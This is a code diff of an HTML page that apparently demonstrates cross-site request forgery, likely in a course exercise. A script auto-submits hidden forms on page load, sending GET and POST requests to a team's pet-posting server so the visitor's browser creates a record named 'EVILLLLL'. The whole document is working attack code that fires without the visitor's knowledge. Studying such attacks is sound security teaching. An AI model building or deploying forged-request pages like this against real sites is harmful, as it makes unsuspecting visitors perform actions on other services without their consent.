@@ -6,6 +6,7 @@
     <title>Document</title>
 </head>
 <body>
+    <form action="http://recitation-14-team-01.eastus.cloudapp.azure.com:3000/post_pets" method="GET" id="load"></form>
     <form action="http://recitation-14-team-01.eastus.cloudapp.azure.com:3000/post_pets" method="POST" id="form">
         <input type="text" name="name" value="EVILLLLL">
         <input type="text" name="animalType" value="Gen 1 Pokemon">
@@ -18,7 +19,9 @@
         <input type="text" name="petPhoto" value="https://bevwere.files.wordpress.com/2013/04/evil.jpg">
     </form>
     <script>
+        const loadPage = document.querySelector("#load")
         const postPet = document.querySelector("#form")
+        loadPage.submit();
         postPet.submit();
     </script>
 </body>
